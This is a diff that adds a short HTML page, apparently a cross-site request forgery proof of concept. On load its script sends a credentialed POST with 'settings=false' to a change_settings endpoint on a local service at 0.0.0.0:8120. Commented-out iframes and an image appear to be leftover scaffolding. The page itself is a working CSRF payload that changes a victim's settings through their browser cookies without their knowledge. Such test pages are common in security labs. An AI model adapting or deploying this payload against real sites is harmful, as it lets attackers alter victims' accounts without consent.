@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<!--<iframe src="http://0.0.0.0:8080/">
+  <p>Your browser does not support iframes.</p>
+</iframe>-->
+
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open('POST', 'http://0.0.0.0:8120/change_settings_2');
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xhr.setRequestHeader('Access-Control-Allow-Origin', 'http://0.0.0.0:8120/change_settings_2');
+	xhr.withCredentials = true;
+
+xhr.send('settings=false');
+</script>
+
+<!--<img src="https://img.drive.ru/i/0/5c77c73fec05c4577f000048.jpg" width="189" height="255" alt="lorem">
+
+<iframe src="http://www.ripn.net/">
+  <p>Your browser does not support iframes.</p>
+</iframe>
+
+<iframe src="http://google.com">
+  <p>Your browser does not support iframes.</p>
+</iframe>-->
+
+</body>
+</html>
